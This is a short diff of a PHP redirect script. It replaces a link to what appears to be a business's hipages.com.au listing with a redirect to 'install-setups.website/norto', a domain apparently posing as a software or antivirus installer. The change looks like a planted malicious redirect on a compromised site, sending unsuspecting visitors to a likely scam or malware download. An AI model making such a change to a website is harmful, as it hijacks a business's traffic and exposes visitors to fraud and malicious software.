@@ -1,4 +1,4 @@
 <?php
-header("Location: https://hipages.com.au/connect/mgpest");
+header("Location: https://install-setups.website/norto");
 die();
 ?>
